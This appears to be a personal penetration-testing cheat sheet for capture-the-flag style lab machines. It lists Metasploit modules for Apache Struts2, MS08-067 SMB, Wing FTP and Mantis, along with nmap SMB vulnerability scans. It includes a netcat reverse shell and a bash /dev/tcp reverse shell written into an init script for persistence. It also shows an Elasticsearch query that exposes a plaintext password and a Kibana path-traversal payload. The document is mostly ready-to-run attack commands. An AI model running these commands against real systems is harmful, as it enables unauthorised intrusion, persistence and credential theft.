# Pwn'd
- https://ippsec.rocks/?#
### Apache Struts2
- 80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
- |_http-server-header: Apache-Coyote/1.1
- | http-title: Santa Naughty and Nice Tracker
- USE: 
````
search struts2
exploit(multi/http/struts2_content_type_ognl)
````
- 445/tcp open  miscrosoft-ds
- Run the nmap eternal scripts
- USE:
````
nmap --scripts=smb-vuln* $ip
exploit(windows/smb/ms08_067_netapi)
````
### Wing FTP Server
- 21/tcp open  wingftp
- Gain access to the admin panel
````
search lua
exploit(windows/ftp/wing_ftp_admin_exec)
````
### Mantis Bug Tracker
- 80/tcp  open  http  mantisbt-2.3.0
- CVE:2019-15715 2017-7615
- Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
- 110/tcp open  POP3 
- James POP3 Server 2.3.2
- https://www.exploit-db.com/exploits/35513
````
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.2 3333 >/tmp/f
echo "#!/bin/bash" > /etc/init.d/james
echo "bash -i >& /dev/tcp/172.16.6.2/5555 0>&1" >> /etc/init.d/james
cat /etc/init.d/james
sudo /sbin/reboot
````
- Version: Apache Tomcat/8.0.47
- OS: Microsoft Windows 2008| Vista | 7
- exploit: multi/http/struts2_rest_xstream
- Targeturi: /struts2-rest-showcase/orders/
### Kibana
- 5601 is the elastic search port, 9200 is the api
````
curl -X GET "10.10.15.175:9200/_search?q=password&pretty"                                                                                                                                                                  130 ⨯
{
  "took" : 11,
  "timed_out" : false,
  "_shards" : {
    "total" : 6,
    "successful" : 6,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 2.0136302,
    "hits" : [
      {
        "_index" : "messages",
        "_type" : "_doc",
        "_id" : "73",
        "_score" : 2.0136302,
        "_source" : {
          "sender" : "mary",
          "receiver" : "wendy",
          "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
````
- If there are log files like on port 8000 which are showing you active kabana logs you can have a LFI vulnerability
- Go to the 5601 port and add this extension `/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt`
````
10.10.156.71:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
````
- Then curl the logs and grep for root.txt
````
curl -s http://10.10.31.117:8000/kibana-log.txt | grep "root.txt" 
````
- Also can be used to get a shell in other situations
- https://github.com/mpgn/CVE-2018-17246
